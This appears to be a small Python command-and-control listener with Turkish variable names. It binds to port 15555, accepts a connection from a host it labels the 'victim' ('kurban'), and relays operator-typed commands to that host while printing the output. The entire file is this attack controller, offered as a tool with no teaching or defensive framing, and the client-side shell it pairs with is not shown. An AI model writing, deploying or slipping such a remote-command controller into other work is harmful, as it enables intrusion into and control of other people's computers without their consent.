import socket

host=""
port=15555
s=socket.socket()


def bagla():
    try:
        s.bind((host,port))
        s.listen()

    except:
        print("baglantı hatası")
        bagla()

def kabul_et():
    print("Baglantı bekleniyor")
    baglanti,adres=s.accept()
    print("Bağlantı gerçekleşti kurban ip:",adres[0],"kurban port:",adres[1])
    komut_yolla(baglanti)
    baglanti.close() 
    


def komut_yolla(baglanti):
    while True:
        cmd=input("What is your code")
        if cmd=="quit":  
            break 

        if len(cmd)>0:
            baglanti.send(cmd.encode("utf-8"))
            cevap=baglanti.recv(4096).decode("utf-8")
            print(cevap)
            

bagla()
kabul_et()
